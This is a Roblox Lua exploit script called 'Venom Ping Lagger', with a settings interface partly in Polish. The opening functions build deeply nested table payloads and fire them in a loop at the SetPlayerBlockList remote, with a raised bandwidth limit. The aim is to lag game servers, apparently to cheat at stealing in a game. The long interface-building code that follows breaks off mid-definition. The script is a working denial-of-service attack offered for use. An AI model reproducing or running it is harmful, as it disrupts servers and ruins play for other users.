local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ProximityPromptService = game:GetService("ProximityPromptService")
local LocalPlayer = Players.LocalPlayer

local targetParent = LocalPlayer:WaitForChild("PlayerGui")
pcall(function()
    targetParent = (typeof(gethui) == "function" and gethui()) or game:GetService("CoreGui")
end)

local config = {
    power = 100000,
    delay = 0.125,
    keybind = Enum.KeyCode.F,
    controllerBind = Enum.KeyCode.ButtonR2,
    autoSteal = true,
    selectedBg = nil
}

local laggerActive = false
local lagThread = nil
local listeningForKey = false
local listeningForCtrl = false

local payloadCache = {}
local function getPayload(power)
    if payloadCache[power] then return payloadCache[power] end
    local chain = {}
    local last = chain
    for _ = 1, 25 do
        local t = {}
        table.insert(last, t)
        last = t
    end
    local max = math.min(12000, math.floor(power / 10))
    local main = {}
    for _ = 1, max do
        table.insert(main, chain)
    end
    payloadCache[power] = main
    return main
end

local function fireLag(power)
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(getPayload(power))
    end)
end

local function startLag()
    if lagThread then task.cancel(lagThread) end
    lagThread = task.spawn(function()
        while laggerActive do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
            end)
            fireLag(config.power)
            task.wait(config.delay)
        end
    end)
end

local function stopLag()
    if lagThread then
        task.cancel(lagThread)
        lagThread = nil
    end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "VenomPingLaggerGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 30
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = targetParent

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Active = true
MainFrame.ClipsDescendants = true
MainFrame.Position = UDim2.new(0.5, -40, 0.5, 60)
MainFrame.Size = UDim2.new(0, 310, 0, 128)
MainFrame.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

local MainStroke = Instance.new("UIStroke")
MainStroke.Color = Color3.fromRGB(40, 40, 40)
MainStroke.Thickness = 1.2
MainStroke.Transparency = 0.2
MainStroke.Parent = MainFrame

local MainBg = Instance.new("ImageLabel")
MainBg.Name = "MainBg"
MainBg.ZIndex = 0
MainBg.Size = UDim2.new(1, 0, 1, 0)
MainBg.BackgroundTransparency = 1
MainBg.ImageTransparency = 0.15
MainBg.ScaleType = Enum.ScaleType.Crop
MainBg.Visible = false
MainBg.Parent = MainFrame

local MainBgCorner = Instance.new("UICorner")
MainBgCorner.CornerRadius = UDim.new(0, 8)
MainBgCorner.Parent = MainBg

local LeftAccent = Instance.new("Frame")
LeftAccent.Name = "LeftAccent"
LeftAccent.ZIndex = 5
LeftAccent.Position = UDim2.new(0, 0, 0, 8)
LeftAccent.Size = UDim2.new(0, 3, 1, -16)
LeftAccent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LeftAccent.BackgroundTransparency = 0.65
LeftAccent.BorderSizePixel = 0
LeftAccent.Parent = MainFrame

local MainHeader = Instance.new("Frame")
MainHeader.Name = "MainHeader"
MainHeader.ZIndex = 6
MainHeader.Size = UDim2.new(1, 0, 0, 46)
MainHeader.BackgroundTransparency = 1
MainHeader.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.ZIndex = 7
TitleLabel.Position = UDim2.new(0, 20, 0, 8)
TitleLabel.Size = UDim2.new(1, -120, 0, 18)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "VENOM PING LAGGER"
TitleLabel.TextColor3 = Color3.fromRGB(252, 252, 252)
TitleLabel.TextSize = 13
TitleLabel.Font = Enum.Font.GothamBlack
TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
TitleLabel.Parent = MainHeader

local SubTitleLabel = Instance.new("TextLabel")
SubTitleLabel.Name = "SubTitleLabel"
SubTitleLabel.ZIndex = 7
SubTitleLabel.Position = UDim2.new(0, 20, 0, 25)
SubTitleLabel.Size = UDim2.new(1, -120, 0, 16)
SubTitleLabel.BackgroundTransparency = 1
SubTitleLabel.Text = "Made by Stixy"
SubTitleLabel.TextColor3 = Color3.fromRGB(252, 252, 252)
SubTitleLabel.TextSize = 13
SubTitleLabel.Font = Enum.Font.GothamMedium
SubTitleLabel.TextXAlignment = Enum.TextXAlignment.Left
SubTitleLabel.Parent = MainHeader

local StatusBadge = Instance.new("Frame")
StatusBadge.Name = "StatusBadge"
StatusBadge.ZIndex = 7
StatusBadge.Position = UDim2.new(1, -108, 0.5, -10)
StatusBadge.Size = UDim2.new(0, 52, 0, 20)
StatusBadge.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
StatusBadge.BackgroundTransparency = 0.25
StatusBadge.BorderSizePixel = 0
StatusBadge.Parent = MainHeader

local StatusBadgeStroke = Instance.new("UIStroke")
StatusBadgeStroke.Color = Color3.fromRGB(58, 58, 58)
StatusBadgeStroke.Thickness = 1
StatusBadgeStroke.Transparency = 0.3
StatusBadgeStroke.Parent = StatusBadge

local StatusText = Instance.new("TextLabel")
StatusText.Name = "StatusText"
StatusText.ZIndex = 8
StatusText.Size = UDim2.new(1, 0, 1, 0)
StatusText.BackgroundTransparency = 1
StatusText.Text = "WYŁĄCZ"
StatusText.TextColor3 = Color3.fromRGB(70, 70, 70)
StatusText.TextSize = 10
StatusText.Font = Enum.Font.GothamBold
StatusText.Parent = StatusBadge

local SettingsToggleBtn = Instance.new("TextButton")
SettingsToggleBtn.Name = "SettingsToggleBtn"
SettingsToggleBtn.ZIndex = 7
SettingsToggleBtn.Position = UDim2.new(1, -46, 0.5, -14)
SettingsToggleBtn.Size = UDim2.new(0, 28, 0, 28)
SettingsToggleBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
SettingsToggleBtn.BackgroundTransparency = 0.25
SettingsToggleBtn.BorderSizePixel = 0
SettingsToggleBtn.Text = "⚙"
SettingsToggleBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
SettingsToggleBtn.TextSize = 14
SettingsToggleBtn.Font = Enum.Font.GothamBold
SettingsToggleBtn.AutoButtonColor = false
SettingsToggleBtn.Parent = MainHeader

local SettingsBtnStroke = Instance.new("UIStroke")
SettingsBtnStroke.Color = Color3.fromRGB(40, 40, 40)
SettingsBtnStroke.Thickness = 1
SettingsBtnStroke.Transparency = 0.25
SettingsBtnStroke.Parent = SettingsToggleBtn

local ActivateBtn = Instance.new("TextButton")
ActivateBtn.Name = "ActivateBtn"
ActivateBtn.ZIndex = 6
ActivateBtn.Position = UDim2.new(0, 18, 0, 62)
ActivateBtn.Size = UDim2.new(1, -36, 0, 44)
ActivateBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
ActivateBtn.BackgroundTransparency = 0.2
ActivateBtn.BorderSizePixel = 0
ActivateBtn.Text = "ACTIVATE"
ActivateBtn.TextColor3 = Color3.fromRGB(252, 252, 252)
ActivateBtn.TextSize = 15
ActivateBtn.Font = Enum.Font.GothamBlack
ActivateBtn.AutoButtonColor = false
ActivateBtn.Parent = MainFrame

local ActivateBtnStroke = Instance.new("UIStroke")
ActivateBtnStroke.Color = Color3.fromRGB(58, 58, 58)
ActivateBtnStroke.Thickness = 1.3
ActivateBtnStroke.Transparency = 0.2
ActivateBtnStroke.Parent = ActivateBtn

local SettingsPanel = Instance.new("Frame")
SettingsPanel.Name = "SettingsPanel"
SettingsPanel.Active = true
SettingsPanel.ClipsDescendants = true
SettingsPanel.Position = UDim2.new(0.5, -420, 0.5, -230)
SettingsPanel.Size = UDim2.new(0, 310, 0, 460)
SettingsPanel.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
SettingsPanel.BorderSizePixel = 0
SettingsPanel.Visible = false
SettingsPanel.Parent = ScreenGui

local SettingsCorner = Instance.new("UICorner")
SettingsCorner.CornerRadius = UDim.new(0, 8)
SettingsCorner.Parent = SettingsPanel

local SettingsStroke = Instance.new("UIStroke")
SettingsStroke.Color = Color3.fromRGB(40, 40, 40)
SettingsStroke.Thickness = 1.2
SettingsStroke.Transparency = 0.15
SettingsStroke.Parent = SettingsPanel

local SettingsHeader = Instance.new("Frame")
SettingsHeader.Name = "SettingsHeader"
SettingsHeader.ZIndex = 41
SettingsHeader.Size = UDim2.new(1, 0, 0, 50)
SettingsHeader.BackgroundTransparency = 1
SettingsHeader.Parent = SettingsPanel

local SettingsTitle = Instance.new("TextLabel")
SettingsTitle.Name = "SettingsTitle"
SettingsTitle.ZIndex = 42
SettingsTitle.Position = UDim2.new(0, 20, 0, 0)
SettingsTitle.Size = UDim2.new(1, -70, 1, 0)
SettingsTitle.BackgroundTransparency = 1
SettingsTitle.Text = "USTAWIENIA"
SettingsTitle.TextColor3 = Color3.fromRGB(252, 252, 252)
SettingsTitle.TextSize = 16
SettingsTitle.Font = Enum.Font.GothamBlack
SettingsTitle.TextXAlignment = Enum.TextXAlignment.Left
SettingsTitle.Parent = SettingsHeader

local SettingsCloseBtn = Instance.new("TextButton")
SettingsCloseBtn.Name = "SettingsCloseBtn"
SettingsCloseBtn.ZIndex = 43
SettingsCloseBtn.Position = UDim2.new(1, -46, 0.5, -16)
SettingsCloseBtn.Size = UDim2.new(0, 32, 0, 32)
SettingsCloseBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
SettingsCloseBtn.BackgroundTransparency = 0.25
SettingsCloseBtn.BorderSizePixel = 0
SettingsCloseBtn.Text = "×"
SettingsCloseBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
SettingsCloseBtn.TextSize = 20
SettingsCloseBtn.Font = Enum.Font.GothamBold
SettingsCloseBtn.AutoButtonColor = false
SettingsCloseBtn.Parent = SettingsHeader

local SettingsCloseStroke = Instance.new("UIStroke")
SettingsCloseStroke.Color = Color3.fromRGB(40, 40, 40)
SettingsCloseStroke.Thickness = 1
SettingsCloseStroke.Transparency = 0.25
SettingsCloseStroke.Parent = SettingsCloseBtn

local ScrollList = Instance.new("ScrollingFrame")
ScrollList.Name = "ScrollList"
ScrollList.ZIndex = 41
ScrollList.Position = UDim2.new(0, 14, 0, 54)
ScrollList.Size = UDim2.new(1, -28, 1, -66)
ScrollList.BackgroundTransparency = 1
ScrollList.BorderSizePixel = 0
ScrollList.ScrollBarThickness = 3
ScrollList.ScrollBarImageColor3 = Color3.fromRGB(58, 58, 58)
ScrollList.CanvasSize = UDim2.new(0, 0, 0, 540)
ScrollList.Parent = SettingsPanel

local ListLayout = Instance.new("UIListLayout")
ListLayout.Padding = UDim.new(0, 10)
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Parent = ScrollList

local PowerCard = Instance.new("Frame")
PowerCard.Name = "PowerCard"
PowerCard.LayoutOrder = 1
PowerCard.Size = UDim2.new(1, 0, 0, 78)
PowerCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
PowerCard.BackgroundTransparency = 0.45
PowerCard.BorderSizePixel = 0
PowerCard.Parent = ScrollList

local PowerCardStroke = Instance.new("UIStroke")
PowerCardStroke.Color = Color3.fromRGB(40, 40, 40)
PowerCardStroke.Thickness = 1
PowerCardStroke.Transparency = 0.35
PowerCardStroke.Parent = PowerCard

local PowerLabel = Instance.new("TextLabel")
PowerLabel.Name = "PowerLabel"
PowerLabel.Position = UDim2.new(0, 16, 0, 10)
PowerLabel.Size = UDim2.new(1, -24, 0, 14)
PowerLabel.BackgroundTransparency = 1
PowerLabel.Text = "POWER"
PowerLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
PowerLabel.TextSize = 11
PowerLabel.Font = Enum.Font.GothamBold
PowerLabel.TextXAlignment = Enum.TextXAlignment.Left
PowerLabel.Parent = PowerCard

local PowerTag = Instance.new("TextLabel")
PowerTag.Name = "PowerTag"
PowerTag.Position = UDim2.new(0, 16, 0, 34)
PowerTag.Size = UDim2.new(0, 52, 0, 28)
PowerTag.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
PowerTag.BackgroundTransparency = 0.25
PowerTag.BorderSizePixel = 0
PowerTag.Text = "100K"
PowerTag.TextColor3 = Color3.fromRGB(255, 255, 255)
PowerTag.TextSize = 12
PowerTag.Font = Enum.Font.GothamBold
PowerTag.Parent = PowerCard

local PowerBox = Instance.new("TextBox")
PowerBox.Name = "PowerBox"
PowerBox.Position = UDim2.new(0, 74, 0, 34)
PowerBox.Size = UDim2.new(1, -90, 0, 28)
PowerBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
PowerBox.BackgroundTransparency = 0.3
PowerBox.BorderSizePixel = 0
PowerBox.ClearTextOnFocus = false
PowerBox.Text = "100000"
PowerBox.TextColor3 = Color3.fromRGB(252, 252, 252)
PowerBox.TextSize = 12
PowerBox.Font = Enum.Font.GothamBold
PowerBox.Parent = PowerCard

local PowerBoxStroke = Instance.new("UIStroke")
PowerBoxStroke.Color = Color3.fromRGB(40, 40, 40)
PowerBoxStroke.Thickness = 1
PowerBoxStroke.Transparency = 0.35
PowerBoxStroke.Parent = PowerBox

local DelayCard = Instance.new("Frame")
DelayCard.Name = "DelayCard"
DelayCard.LayoutOrder = 2
DelayCard.Size = UDim2.new(1, 0, 0, 78)
DelayCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
DelayCard.BackgroundTransparency = 0.45
DelayCard.BorderSizePixel = 0
DelayCard.Parent = ScrollList

local DelayCardStroke = Instance.new("UIStroke")
DelayCardStroke.Color = Color3.fromRGB(40, 40, 40)
DelayCardStroke.Thickness = 1
DelayCardStroke.Transparency = 0.35
DelayCardStroke.Parent = DelayCard

local DelayLabel = Instance.new("TextLabel")
DelayLabel.Name = "DelayLabel"
DelayLabel.Position = UDim2.new(0, 16, 0, 10)
DelayLabel.Size = UDim2.new(1, -24, 0, 14)
DelayLabel.BackgroundTransparency = 1
DelayLabel.Text = "DELAY (SECONDS)"
DelayLabel.TextColor3 = Color3.fromRGB(100, 100, 100)
DelayLabel.TextSize = 11
DelayLabel.Font = Enum.Font.GothamBold
DelayLabel.TextXAlignment = Enum.TextXAlignment.Left
DelayLabel.Parent = DelayCard

local DelayBox = Instance.new("TextBox")
DelayBox.Name = "DelayBox"
DelayBox.Position = UDim2.new(0, 16, 0, 34)
DelayBox.Size = UDim2.new(1, -32, 0, 28)
DelayBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
DelayBox.BackgroundTransparency = 0.3
DelayBox.BorderSizePixel = 0
DelayBox.ClearTextOnFocus = false
DelayBox.Text = "0.125"
DelayBox.TextColor3 = Color3.fromRGB(252, 252, 252)
DelayBox.TextSize = 12
DelayBox.Font = Enum.Font.GothamBold
DelayBox.Parent = DelayCard

local DelayBoxStroke = Instance.new("UIStroke")
DelayBoxStroke.Color = Color3.fromRGB(40, 40, 40)
DelayBoxStroke.Thickness = 1
DelayBoxStroke.Transparency = 0.35
DelayBoxStroke.Parent = DelayBox

local AutoStealCard = Instance.new("Frame")
AutoStealCard.Name = "AutoStealCard"
AutoStealCard.LayoutOrder = 3
AutoStealCard.Size = UDim2.new(1, 0, 0, 56)
AutoStealCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
AutoStealCard.BackgroundTransparency = 0.45
AutoStealCard.BorderSizePixel = 0
AutoStealCard.Parent = ScrollList

local AutoStealStroke = Instance.new("UIStroke")
AutoStealStroke.Color = Color3.fromRGB(40, 40, 40)
AutoStealStroke.Thickness = 1
AutoStealStroke.Transparency = 0.35
AutoStealStroke.Parent = AutoStealCard

local AutoStealLabel = Instance.new("TextLabel")
AutoStealLabel.Name = "AutoStealLabel"
AutoStealLabel.Position = UDim2.new(0, 16, 0, 0)
AutoStealLabel.Size = UDim2.new(0.6, 0, 1, 0)
AutoStealLabel.BackgroundTransparency = 1
AutoStealLabel.Text = "Auto On Steal"
AutoStealLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
AutoStealLabel.TextSize = 13
AutoStealLabel.Font = Enum.Font.GothamMedium
AutoStealLabel.TextXAlignment = Enum.TextXAlignment.Left
AutoStealLabel.Parent = AutoStealCard

local AutoStealBtn = Instance.new("TextButton")
AutoStealBtn.Name = "AutoStealBtn"
AutoStealBtn.Position = UDim2.new(1, -84, 0.5, -14)
AutoStealBtn.Size = UDim2.new(0, 68, 0, 28)
AutoStealBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AutoStealBtn.BackgroundTransparency = 0.05
AutoStealBtn.BorderSizePixel = 0
AutoStealBtn.Text = "WŁĄCZONY"
AutoStealBtn.TextColor3 = Color3.fromRGB(5, 5, 5)
AutoStealBtn.TextSize = 10
AutoStealBtn.Font = Enum.Font.GothamBold
AutoStealBtn.AutoButtonColor = false
AutoStealBtn.Parent = AutoStealCard

local BgHeader = Instance.new("TextLabel")
BgHeader.Name = "BgHeader"
BgHeader.LayoutOrder = 4
BgHeader.Size = UDim2.new(1, 0, 0, 16)
BgHeader.BackgroundTransparency = 1
BgHeader.Text = "SETTINGS BACKGROUND"
BgHeader.TextColor3 = Color3.fromRGB(100, 100, 100)
BgHeader.TextSize = 11
BgHeader.Font = Enum.Font.GothamBold
BgHeader.TextXAlignment = Enum.TextXAlignment.Left
BgHeader.Parent = ScrollList

local BgCard = Instance.new("Frame")
BgCard.Name = "BgCard"
BgCard.LayoutOrder = 5
BgCard.Size = UDim2.new(1, 0, 0, 100)
BgCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
BgCard.BackgroundTransparency = 0.45
BgCard.BorderSizePixel = 0
BgCard.Parent = ScrollList

local BgCardStroke = Instance.new("UIStroke")
BgCardStroke.Color = Color3.fromRGB(40, 40, 40)
BgCardStroke.Thickness = 1
BgCardStroke.Transparency = 0.35
BgCardStroke.Parent = BgCard

local BgScroll = Instance.new("ScrollingFrame")
BgScroll.Name = "BgScroll"
BgScroll.Position = UDim2.new(0, 12, 0, 14)
BgScroll.Size = UDim2.new(1, -24, 0, 72)
BgScroll.BackgroundTransparency = 1
BgScroll.BorderSizePixel = 0
BgScroll.ScrollBarThickness = 4
BgScroll.ScrollBarImageColor3 = Color3.fromRGB(58, 58, 58)
BgScroll.ScrollingDirection = Enum.ScrollingDirection.X
BgScroll.CanvasSize = UDim2.new(0, 290, 0, 0)
BgScroll.Parent = BgCard

local BgScrollLayout = Instance.new("UIListLayout")
BgScrollLayout.FillDirection = Enum.FillDirection.Horizontal
BgScrollLayout.VerticalAlignment = Enum.VerticalAlignment.Center
BgScrollLayout.Padding = UDim.new(0, 8)
BgScrollLayout.Parent = BgScroll

local bgOptions = {
    { id = nil },
    { id = "rbxassetid://95057304346078" },
    { id = "rbxassetid://120064741846101" },
    { id = "rbxassetid://129737351344372" },
    { id = "rbxassetid://106847947789220" }
}

local bgButtons = {}
local function setBackground(id)
    config.selectedBg = id
    if id then
        MainBg.Image = id
        MainBg.Visible = true
    else
        MainBg.Visible = false
    end
    for imgId, btnObj in pairs(bgButtons) do
        local str = btnObj:FindFirstChildOfClass("UIStroke")
        if str then
            local isCurrent = (imgId == (id or "NONE"))
            str.Color = isCurrent and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(40, 40, 40)
            str.Thickness = isCurrent and 2 or 1
            str.Transparency = isCurrent and 0 or 0.4
        end
    end
end

for _, opt in ipairs(bgOptions) do
    if opt.id == nil then
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 48, 0, 48)
        btn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
        btn.BackgroundTransparency = 0.2
        btn.BorderSizePixel = 0
        btn.Text = "None"
        btn.TextColor3 = Color3.fromRGB(170, 170, 170)
        btn.TextSize = 11
        btn.Font = Enum.Font.GothamBold
        btn.AutoButtonColor = false
        btn.Parent = BgScroll

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(255, 255, 255)
        stroke.Thickness = 2
        stroke.Transparency = 0
        stroke.Parent = btn

        bgButtons["NONE"] = btn

        btn.MouseButton1Click:Connect(function()
            setBackground(nil)
        end)
    else
        local btn = Instance.new("ImageButton")
        btn.Size = UDim2.new(0, 48, 0, 48)
        btn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
        btn.BackgroundTransparency = 0.2
        btn.BorderSizePixel = 0
        btn.Image = opt.id
        btn.ImageTransparency = 0.1
        btn.ScaleType = Enum.ScaleType.Crop
        btn.AutoButtonColor = false
        btn.Parent = BgScroll

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(40, 40, 40)
        stroke.Thickness = 1
        stroke.Transparency = 0.4
        stroke.Parent = btn

        bgButtons[opt.id] = btn

        btn.MouseButton1Click:Connect(function()
            if config.selectedBg == opt.id then
                setBackground(nil)
            else
                setBackground(opt.id)
            end
        end)
    end
end

local KeybindHeader = Instance.new("TextLabel")
KeybindHeader.Name = "KeybindHeader"
KeybindHeader.LayoutOrder = 6
KeybindHeader.Size = UDim2.new(1, 0, 0, 16)
KeybindHeader.BackgroundTransparency = 1
KeybindHeader.Text = "Przyciski klawiszowe"
KeybindHeader.TextColor3 = Color3.fromRGB(100, 100, 100)
KeybindHeader.TextSize = 11
KeybindHeader.Font = Enum.Font.GothamBold
KeybindHeader.TextXAlignment = Enum.TextXAlignment.Left
KeybindHeader.Parent = ScrollList

local KeybindCard = Instance.new("Frame")
KeybindCard.Name = "KeybindCard"
KeybindCard.LayoutOrder = 7
KeybindCard.Size = UDim2.new(1, 0, 0, 56)
KeybindCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
KeybindCard.BackgroundTransparency = 0.45
KeybindCard.BorderSizePixel = 0
KeybindCard.Parent = ScrollList

local KeybindCardStroke = Instance.new("UIStroke")
KeybindCardStroke.Color = Color3.fromRGB(40, 40, 40)
KeybindCardStroke.Thickness = 1
KeybindCardStroke.Transparency = 0.35
KeybindCardStroke.Parent = KeybindCard

local KeybindLabel = Instance.new("TextLabel")
KeybindLabel.Name = "KeybindLabel"
KeybindLabel.Position = UDim2.new(0, 16, 0, 0)
KeybindLabel.Size = UDim2.new(0.36, 0, 1, 0)
KeybindLabel.BackgroundTransparency = 1
KeybindLabel.Text = "Klawiatura"
KeybindLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
KeybindLabel.TextSize = 13
KeybindLabel.Font = Enum.Font.GothamMedium
KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
KeybindLabel.Parent = KeybindCard

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.Name = "KeybindBtn"
KeybindBtn.Position = UDim2.new(1, -132, 0.5, -14)
KeybindBtn.Size = UDim2.new(0, 88, 0, 28)
KeybindBtn.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
KeybindBtn.BackgroundTransparency = 0.3
KeybindBtn.BorderSizePixel = 0
KeybindBtn.Text = "F"
KeybindBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
KeybindBtn.TextSize = 12
KeybindBtn.Font = Enum.Font.GothamBold
KeybindBtn.AutoButtonColor = false
KeybindBtn.Parent = KeybindCard

local KeybindBtnStroke = Instance.new("UIStroke")
KeybindBtnStroke.Color = Color3.fromRGB(40, 40, 40)
KeybindBtnStroke.Thickness = 1
KeybindBtnStroke.Transparency = 0.35
KeybindBtnStroke.Parent = KeybindBtn

local ClearKeybindBtn = Instance.new("TextButton")
ClearKeybindBtn.Name = "ClearKeybindBtn"
ClearKeybindBtn.Position = UDim2.new(1, -38, 0.5, -14)
ClearKeybindBtn.Size = UDim2.new(0, 28, 0, 28)
ClearKeybindBtn.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
ClearKeybindBtn.BackgroundTransparency = 0.3
ClearKeybindBtn.BorderSizePixel = 0
ClearKeybindBtn.Text = "×"
ClearKeybindBtn.TextColor3 = Color3.fromRGB(70, 70, 70)
ClearKeybindBtn.TextSize = 15
ClearKeybindBtn.Font = Enum.Font.GothamBold
ClearKeybindBtn.AutoButtonColor = false
ClearKeybindBtn.Parent = KeybindCard

local ControllerCard = Instance.new("Frame")
ControllerCard.Name = "ControllerCard"
ControllerCard.LayoutOrder = 8
ControllerCard.Size = UDim2.new(1, 0, 0, 56)
ControllerCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ControllerCard.BackgroundTransparency = 0.45
ControllerCard.BorderSizePixel = 0
ControllerCard.Parent = ScrollList

local ControllerCardStroke = Instance.new("UIStroke")
ControllerCardStroke.Color = Color3.fromRGB(40, 40, 40)
ControllerCardStroke.Thickness = 1
ControllerCardStroke.Transparency = 0.35
ControllerCardStroke.Parent = ControllerCard

local ControllerLabel = Instance.new("TextLabel")
ControllerLabel.Name = "ControllerLabel"
ControllerLabel.Position = UDim2.new(0, 16, 0, 0)
ControllerLabel.Size = UDim2.new(0.36, 0, 1, 0)
ControllerLabel.BackgroundTransparency = 1
ControllerLabel.Text = "Controller"
ControllerLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
ControllerLabel.TextSize = 13
ControllerLabel.Font = Enum.Font.GothamMedium
ControllerLabel.TextXAlignment = Enum.TextXAlignment.Left
ControllerLabel.Parent = ControllerCard

local ControllerBtn = Instance.new("TextButton")
ControllerBtn.Name = "ControllerBtn"
ControllerBtn.Position = UDim2.new(1, -132, 0.5, -14)
ControllerBtn.Size = UDim2.new(0, 88, 0, 28)
ControllerBtn.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
ControllerBtn.BackgroundTransparency = 0.3
ControllerBtn.BorderSizePixel = 0
ControllerBtn.Text = "ButtonR2"
ControllerBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
ControllerBtn.TextSize = 12
ControllerBtn.Font = Enum.Font.GothamBold
ControllerBtn.AutoButtonColor = false
ControllerBtn.Parent = ControllerCard

local ControllerBtnStroke = Instance.new("UIStroke")
ControllerBtnStroke.Color = Color3.fromRGB(40, 40, 40)
ControllerBtnStroke.Thickness = 1
ControllerBtnStroke.Transparency = 0.35
ControllerBtnStroke.Parent = ControllerBtn

local ClearControllerBtn = Instance.new("TextButton")
ClearControllerBtn.Name = "ClearControllerBtn"
ClearControllerBtn.Position = UDim2.new(1, -38, 0.5, -14)
ClearControllerBtn.Size = UDim2.new(0, 28, 0, 28)
ClearControllerBtn.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
ClearControllerBtn.BackgroundTransparency = 0.3
ClearControllerBtn.BorderSizePixel = 0
ClearControllerBtn.Text = "×"
ClearControllerBtn.TextColor3 = Color3.fromRGB(70, 70, 70)
ClearControllerBtn.TextSize = 15
ClearControllerBtn.Font = Enum.Font.GothamBold
ClearControllerBtn.AutoButtonColor = false
ClearControllerBtn.Parent = ControllerCard

local ResetCard = Instance.new("Frame")
ResetCard.Name = "ResetCard"
ResetCard.LayoutOrder = 9
ResetCard.Size = UDim2.new(1, 0, 0, 52)
ResetCard.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
ResetCard.BackgroundTransparency = 0.45
ResetCard.BorderSizePixel = 0
ResetCard.Parent = ScrollList

local ResetCardStroke = Instance.new("UIStroke")
ResetCardStroke.Color = Color3.fromRGB(40, 40, 40)
ResetCardStroke.Thickness = 1
ResetCardStroke.Transparency = 0.35
ResetCardStroke.Parent = ResetCard

local ResetBtn = Instance.new("TextButton")
ResetBtn.Name = "ResetBtn"
ResetBtn.Position = UDim2.new(0, 12, 0.5, -17)
ResetBtn.Size = UDim2.new(1, -24, 0, 34)
ResetBtn.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
ResetBtn.BackgroundTransparency = 0.25
ResetBtn.BorderSizePixel = 0
ResetBtn.Text = "Reset to Defaults"
ResetBtn.TextColor3 = Color3.fromRGB(170, 170, 170)
ResetBtn.TextSize = 13
ResetBtn.Font = Enum.Font.GothamMedium
ResetBtn.AutoButtonColor = false
ResetBtn.Parent = ResetCard

local ResetBtnStroke = Instance.new("UIStroke")
ResetBtnStroke.Color = Color3.fromRGB(40, 40, 40)
ResetBtnStroke.Thickness = 1
ResetBtnStroke.Transparency = 0.3
ResetBtnStroke.Parent = ResetBtn

local ConfirmModal = Instance.new("Frame")
ConfirmModal.Name = "ConfirmModal"
ConfirmModal.ZIndex = 80
ConfirmModal.Size = UDim2.new(1, 0, 1, 0)
ConfirmModal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ConfirmModal.BackgroundTransparency = 0.55
ConfirmModal.BorderSizePixel = 0
ConfirmModal.Visible = false
ConfirmModal.Parent = ScreenGui

local ModalBox = Instance.new("Frame")
ModalBox.Name = "ModalBox"
ModalBox.ZIndex = 81
ModalBox.Position = UDim2.new(0.5, -140, 0.5, -75)
ModalBox.Size = UDim2.new(0, 280, 0, 150)
ModalBox.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
ModalBox.BackgroundTransparency = 0.15
ModalBox.BorderSizePixel = 0
ModalBox.Parent = ConfirmModal

local ModalStroke = Instance.new("UIStroke")
ModalStroke.Color = Color3.fromRGB(40, 40, 40)
ModalStroke.Parent = ModalBox

local ModalText = Instance.new("TextLabel")
ModalText.Name = "ModalText"
ModalText.ZIndex = 82
ModalText.Position = UDim2.new(0, 18, 0, 22)
ModalText.Size = UDim2.new(1, -36, 0, 50)
ModalText.BackgroundTransparency = 1
ModalText.Text = "Reset all settings\nto defaults?"
ModalText.TextColor3 = Color3.fromRGB(252, 252, 252)
ModalText.TextSize = 14
ModalText.Font = Enum.Font.GothamMedium
ModalText.TextWrapped = true
ModalText.Parent = ModalBox

local ConfirmBtn = Instance.new("TextButton")
ConfirmBtn.Name = "ConfirmBtn"
ConfirmBtn.ZIndex = 82
ConfirmBtn.Position = UDim2.new(0, 18, 1, -52)
ConfirmBtn.Size = UDim2.new(0, 110, 0, 34)
